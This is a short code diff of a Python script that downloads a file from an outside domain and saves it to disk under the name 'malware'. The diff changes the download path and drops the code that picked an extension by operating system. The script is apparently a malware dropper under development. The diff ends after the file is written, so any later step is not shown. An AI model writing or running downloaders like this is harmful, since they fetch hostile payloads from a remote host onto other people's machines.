@@ -8,20 +8,15 @@ from time import sleep
 
 PROTO = "http://"
 DOMAIN = "somnoynadno.ru"
-PATH = "/static/bin/malware"
+PATH = "/files/95e0169e10882231636b5f9f895aa923/main"
 
 s = platform.system()
 
-if s == "Windows":
-	EXT = ".exe"
-else:
-	EXT = ".bin"
-
-URL = PROTO + DOMAIN + PATH + EXT
+URL = PROTO + DOMAIN + PATH
 r = requests.get(URL)
 
 if r.status_code == 200:
-	FILENAME = "malware" + EXT
+	FILENAME = "malware"
 	with open(FILENAME, 'wb') as f:
 		f.write(r.content)
 
